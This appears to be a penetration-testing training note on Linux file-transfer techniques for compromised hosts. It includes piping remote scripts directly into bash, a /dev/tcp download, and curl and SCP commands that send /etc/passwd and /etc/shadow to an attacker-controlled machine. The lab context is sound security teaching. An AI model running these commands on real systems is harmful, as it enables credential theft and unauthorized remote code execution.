# Download Operations

## 1. Base64 Encoding / Decoding

- Depending on the file size we want to transfer, we can use a method that does not require network communication. If we have access to a terminal, we can encode a file to a base64 string, copy its content into the terminal and perform the reverse operation.

**1 - Check File MD5 hash:**

```
$ md5sum id_rsa

4e301756a07ded0a2dd6953abf015278  id_rsa
```

We use `cat` to print the file content, and base64 encode the output using a pipe `|`. We used the option `-w 0` to create only one line and ended up with the command with a semi-colon (;) and `echo` keyword to start a new line and make it easier to copy.

**2 - Encode SSH Key to Base64:**

```
$ cat id_rsa |base64 -w 0;echo

LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0V...<SNIP>
```

- We copy this content, paste it onto our Linux target machine, and use `base64` with the option `-d' to decode it.

**3 - Linux - Decode the File**

```
echo -n 'LS0tLS1CRUd...<SNIP>...=' | base64 -d > id_rsa
```

Finally, we can confirm if the file was transferred successfully using the md5sum command.

**4 - Linux - Confirm the MD5 Hashes Match**

```
$ md5sum id_rsa

4e301756a07ded0a2dd6953abf015278  id_rsa
```

## 2. Web Downloads with Wget and cURL

Two of the most common utilities in Linux distributions to interact with web applications are `wget` and `curl`. These tools are installed on many Linux distributions.

To download a file using `wget`, we need to specify the URL and the option `-O' to set the output filename.

**1 - Download a File Using wget**

```
[!bash!]$ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
```

`cURL` is very similar to `wget`, but the output filename option is lowercase `-o'.

**2 - Download a File Using cURL**

```
[!bash!]$ curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```

## 3. Fileless Attacks Using Linux

- Because of the way Linux works and how pipes operate, most of the tools we use in Linux can be used to replicate fileless operations, which means that we don't have to download a file to execute it.
- Some payloads such as `mkfifo` write files to disk. Keep in mind that while the execution of the payload may be fileless when you use a pipe, depending on the payload chosen it may create temporary files on the OS.

**1 - Fileless Download with cURL**

```
[!bash!]$ curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```

Similarly, we can download a Python script file from a web server and pipe it into the Python binary. Let's do that, this time using `wget`.

**2 - Fileless Download with wget**

```
[!bash!]$ wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3

Hello World!
```

## 4. Download with Bash (/dev/tcp)

- There may also be situations where none of the well-known file transfer tools are available. As long as Bash version 2.04 or greater is installed (compiled with --enable-net-redirections), the built-in /dev/TCP device file can be used for simple file downloads.

**1 - Connect to the Target Webserver**

```
[!bash!]$ exec 3<>/dev/tcp/10.10.10.32/80
```

**2 - HTTP GET Request**

```
[!bash!]$ echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
```

**3 - Print the Response**

```
[!bash!]$ cat <&3
```

## 5. SSH Downloads

- SSH (Secure Shell) enables secure remote computer access. SSH includes an `SCP` utility for remote file transfer using the SSH protocol by default.
- `SCP` (secure copy) is a command-line utility for securely copying files and directories between hosts - from local to remote servers and vice versa.
- `SCP` works like `copy` or `cp`, but requires specifying a username, remote IP address or DNS name, and user credentials instead of just a local path.
- Before begin downloading files from our target Linux machine to our Pwnbox,set up an SSH server in our Pwnbox.

**1 - Enabling the SSH Server**

```
[!bash!]$ sudo systemctl enable ssh

Synchronizing state of ssh.service with SysV service script with /lib/systemd/systemd-sysv-install.
Executing: /lib/systemd/systemd-sysv-install enable ssh
Use of uninitialized value $service in hash element at /usr/sbin/update-rc.d line 26, <DATA> line 45
...SNIP...
```

**2 - Starting the SSH Server**

```
[!bash!]$ sudo systemctl start ssh
```

**3 - Checking for SSH Listening Port**

```
[!bash!]$ netstat -lnpt

(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
```

Now we can begin transferring files. We need to specify the IP address of our Pwnbox and the username and password.

**4 - Linux - Downloading Files Using SCP**

```
[!bash!]$ scp plaintext@192.168.49.128:/root/myroot.txt . 
```

- You can create a temporary user account for file transfers and avoid using your primary credentials or keys on a remote computer.

# Upload Operations

## 6. Web Upload

- We can use uploadserver, an extended module of the Python `HTTP.Server` module, which includes a file upload page.

**1 - Pwnbox - Start Web Server**

```
[!bash!]$ sudo python3 -m pip install --user uploadserver

Collecting uploadserver
  Using cached uploadserver-2.0.1-py3-none-any.whl (6.9 kB)
Installing collected packages: uploadserver
Successfully installed uploadserver-2.0.1
```

Now we need to create a certificate. In this example, we are using a self-signed certificate.

**2 - Pwnbox - Create a Self-Signed Certificate**

```
[!bash!]$ openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'

Generating a RSA private key
................................................................................+++++
.......+++++
writing new private key to 'server.pem'
-----
```

- The webserver should not host the certificate. We recommend creating a new directory to host the file for our webserver.

**3 - Pwnbox - Start Web Server**

```
[!bash!]$ mkdir https && cd https
[!bash!]$ sudo python3 -m uploadserver 443 --server-certificate ~/server.pem

File upload available at /upload
Serving HTTPS on 0.0.0.0 port 443 (https://0.0.0.0:443/) ...
```

- Now from our compromised machine, let's upload the `/etc/passwd` and `/etc/shadow` files.

**4 - Linux - Upload Multiple Files**

```
[!bash!]$ curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```

- We used the option `--insecure` because we used a self-signed certificate that we trust.

# Alternative Web File Transfer Method

Since Linux distributions typically include `Python` or `php`, starting a web server for file transfers is straightforward. If the compromised server is already a web server, we can move files to the web directory and download them via the web page from our Pwnbox.

Web servers can be created using various languages. When a compromised Linux machine lacks a web server, we can use mini web servers. While they may lack security features, they offer flexibility with easily configurable webroot locations and listening ports.

**Linux - Creating a Web Server with Python3**

```
[!bash!]$ python3 -m http.server

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

**Linux - Creating a Web Server with Python2.7**

```
[!bash!]$ python2.7 -m SimpleHTTPServer

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

**Linux - Creating a Web Server with PHP**

```
[!bash!]$ php -S 0.0.0.0:8000

[Fri May 20 08:16:47 2022] PHP 7.4.28 Development Server (http://0.0.0.0:8000) started
```

**Linux - Creating a Web Server with Ruby**

```
[!bash!]$ ruby -run -ehttpd . -p8000

[2022-05-23 09:35:46] INFO  ruby 2.7.4 (2021-07-07) [x86_64-linux-gnu]
[2022-05-23 09:35:46] INFO  WEBrick::HTTPServer#start: pid=1705 port=8000
```

# SCP Upload

- We may find some companies that allow the `SSH protocol` (TCP/22) for outbound connections, and if that's the case, we can use an SSH server with the `scp` utility to upload files.

**File Upload using SCP**

```
[!bash!]$ scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/

htb-student@10.129.86.90's password: 
passwd
```
